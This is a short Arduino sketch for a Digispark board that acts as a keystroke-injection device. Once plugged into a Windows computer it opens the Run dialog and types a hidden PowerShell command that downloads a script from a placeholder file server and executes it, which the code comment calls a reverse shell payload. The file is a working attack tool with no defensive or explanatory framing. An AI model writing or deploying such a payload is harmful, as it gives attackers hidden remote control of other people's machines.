
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2500);

  /* Donload Reverse Shell Payload */
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('[FILESERVER]/payload.ps1');\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);

  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}
